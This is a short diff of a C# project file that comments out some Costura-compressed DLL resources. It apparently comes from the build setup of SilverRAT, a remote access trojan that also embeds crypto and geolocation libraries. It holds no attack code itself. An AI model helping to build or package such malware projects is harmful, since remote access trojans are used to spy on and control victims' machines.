@@ -75,7 +75,7 @@
     <None Remove="costura.system.threading.accesscontrol.dll.compressed" />
     <None Remove="costura.system.web.services.description.dll.compressed" />
     <None Remove="costura.system.web.services.description.pdb.compressed" />
-    <EmbeddedResource Include="costuraDLL\costura - Kopyala.system.threading.accesscontrol.dll.compressed">
+    <!-- <EmbeddedResource Include="costuraDLL\costura - Kopyala.system.threading.accesscontrol.dll.compressed">
       <LogicalName>costura.system.threading.accesscontrol.dll.compressed</LogicalName>
     </EmbeddedResource>
     <EmbeddedResource Include="costuraDLL\costura - Kopyala.system.web.services.description.dll.compressed">
@@ -83,7 +83,7 @@
     </EmbeddedResource>
     <EmbeddedResource Include="costuraDLL\costura - Kopyala.system.web.services.description.pdb.compressed">
       <LogicalName>costura.system.web.services.description.pdb.compressed</LogicalName>
-    </EmbeddedResource>
+    </EmbeddedResource> -->
     <EmbeddedResource Include="SilverRAT.exe.licenses" LogicalName="SilverRAT.exe.licenses" />
     <EmbeddedResource Include="costuraDLL\costura.bouncycastle.crypto.dll.compressed" LogicalName="costura.bouncycastle.crypto.dll.compressed" />
     <EmbeddedResource Include="costuraDLL\costura.cgeoip.dll.compressed" LogicalName="costura.cgeoip.dll.compressed" />
